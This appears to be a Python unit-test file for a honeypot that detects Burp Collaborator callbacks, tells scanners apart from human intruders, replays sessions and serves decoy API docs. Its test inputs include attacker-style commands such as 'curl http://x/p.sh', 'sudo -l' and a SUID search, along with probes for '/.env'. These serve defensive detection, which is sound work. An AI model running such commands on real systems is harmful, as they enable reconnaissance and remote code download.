import json
import sqlite3
import tempfile
import time
import unittest
from pathlib import Path
from unittest.mock import patch

import api
import enrichment


class V31CoreTests(unittest.TestCase):
    def test_burp_collaborator_payload_is_detected_and_logged(self):
        from v31_core import detect_collaborator_payload

        hit = detect_collaborator_payload("callback=https://abc123.oastify.com/x")

        self.assertEqual(hit["provider"], "oastify")
        self.assertEqual(hit["domain"], "abc123.oastify.com")

    def test_noise_intent_classifier_separates_scanner_from_human(self):
        from v31_core import classify_intent, noise_intent_score

        scanner = noise_intent_score(commands=["GET /wp-login.php", "GET /.env"], session_duration_sec=3, services=["http"])
        human = noise_intent_score(
            commands=["whoami", "id", "sudo -l", "find / -perm -4000", "curl http://x/p.sh"],
            session_duration_sec=180,
            services=["ssh", "telnet"],
            inter_command_delays=[2.5, 8.0, 3.0, 11.0],
        )

        self.assertLess(scanner, 0.6)
        self.assertGreaterEqual(human, 0.6)
        self.assertEqual(classify_intent(human), "human")

    def test_session_replay_engine_outputs_asciinema_v2(self):
        from v31_core import SessionReplay

        replay = SessionReplay(width=80, height=24)
        replay.record(0.25, "whoami\n", stream="i")
        replay.record(0.50, "admin\n", stream="o")
        rendered = replay.to_asciinema()

        lines = rendered.splitlines()
        self.assertEqual(json.loads(lines[0])["version"], 2)
        self.assertEqual(json.loads(lines[1]), [0.25, "i", "whoami\n"])
        self.assertEqual(json.loads(lines[2]), [0.5, "o", "admin\n"])

    def test_http_fingerprint_uses_header_order_and_user_agent(self):
        from v31_core import fingerprint_http_request

        fp1 = fingerprint_http_request("GET / HTTP/1.1\r\nHost: a\r\nUser-Agent: curl\r\nAccept: */*\r\n\r\n")
        fp2 = fingerprint_http_request("GET / HTTP/1.1\r\nUser-Agent: curl\r\nHost: a\r\nAccept: */*\r\n\r\n")

        self.assertEqual(fp1["user_agent"], "curl")
        self.assertNotEqual(fp1["fingerprint"], fp2["fingerprint"])

    def test_enrichment_cache_returns_recent_cached_value_without_external_call(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = str(Path(tmpdir) / "cache.db")
            enrichment.init_enrichment_cache(db_path)
            enrichment.store_enrichment_cache(db_path, "8.8.8.8", {"country": "CachedLand", "reputation_score": 7})

            with patch.object(enrichment, "enrich_with_ip_api", side_effect=AssertionError("external call should not happen")):
                data = enrichment.enrich_ip("8.8.8.8", cache_db_path=db_path)

        self.assertEqual(data["country"], "CachedLand")
        self.assertEqual(data["enrichment_provider"], "cache")

    def test_api_uses_deception_headers_and_decoy_docs(self):
        client = api.app.test_client()

        response = client.get("/api/docs")
        swagger = client.get("/swagger.json")

        self.assertEqual(response.status_code, 200)
        self.assertIn("Apache/2.4.41", response.headers.get("Server", ""))
        self.assertIn("PHP/7.4.3", response.headers.get("X-Powered-By", ""))
        self.assertIn("/api/v1/customers", response.get_data(as_text=True))
        self.assertEqual(swagger.status_code, 200)
        self.assertIn("paths", swagger.get_json())

    def test_task_queue_runs_background_work(self):
        from v31_core import ThreadedTaskQueue

        queue = ThreadedTaskQueue(max_workers=1)
        future = queue.submit(lambda x: x + 1, 41)

        self.assertEqual(future.result(timeout=2), 42)
        queue.shutdown(wait=True)

    def test_write_buffer_flushes_events_in_batches(self):
        from v31_core import EventWriteBuffer

        calls = []
        buffer = EventWriteBuffer(flush_interval=10, sink=lambda batch: calls.append(list(batch)))
        buffer.add({"type": "command", "value": "id"})
        buffer.add({"type": "connection", "ip": "1.2.3.4"})
        flushed = buffer.flush()

        self.assertEqual(flushed, 2)
        self.assertEqual(len(calls), 1)
        self.assertEqual(calls[0][0]["type"], "command")

    def test_lazy_classifier_submits_work_after_disconnect(self):
        from v31_core import LazyClassifier

        classifier = LazyClassifier(predict_fn=lambda text: "Recon" if "whoami" in text else "Unknown")
        future = classifier.classify_session_async(123, ["whoami", "id"])

        self.assertEqual(future.result(timeout=2), {"session_id": 123, "attack_category": "Recon"})
        classifier.shutdown()

    def test_heavy_analysis_is_skipped_for_short_scanner_sessions(self):
        from v31_core import should_run_heavy_analysis

        self.assertFalse(should_run_heavy_analysis(5))
        self.assertTrue(should_run_heavy_analysis(61))

    def test_http_sensor_uses_deception_headers_and_flags_collaborator_payload(self):
        import honeypot

        class FakeSocket:
            def __init__(self):
                self.sent = b""
            def settimeout(self, timeout):
                self.timeout = timeout
            def recv(self, size):
                return b"GET /?u=https://abc.burpcollaborator.net HTTP/1.1\r\nHost: test\r\nUser-Agent: Burp\r\n\r\n"
            def send(self, data):
                self.sent += data
            def close(self):
                self.closed = True

        class FakeLog:
            def log_conn(self, *args, **kwargs):
                pass
            def log_cmd(self, *args, **kwargs):
                pass
            def err(self, *args, **kwargs):
                raise AssertionError(args)

        class FakeDB:
            def __init__(self):
                self.commands = []
            def log_connection(self, *args, **kwargs):
                return 123
            def log_command(self, ip, service, command, connection_id=None, attack_category=None):
                self.commands.append((command, attack_category))
            def update_session_duration(self, *args, **kwargs):
                pass

        sock = FakeSocket()
        db = FakeDB()
        honeypot._handle_http(sock, ("203.0.113.10", 44444), 8080, FakeLog(), db)

        self.assertIn(b"Server: Apache/2.4.41", sock.sent)
        self.assertIn(b"X-Powered-By: PHP/7.4.3", sock.sent)
        self.assertTrue(any(category == "Burp Collaborator Trap" for _, category in db.commands))


if __name__ == "__main__":
    unittest.main()
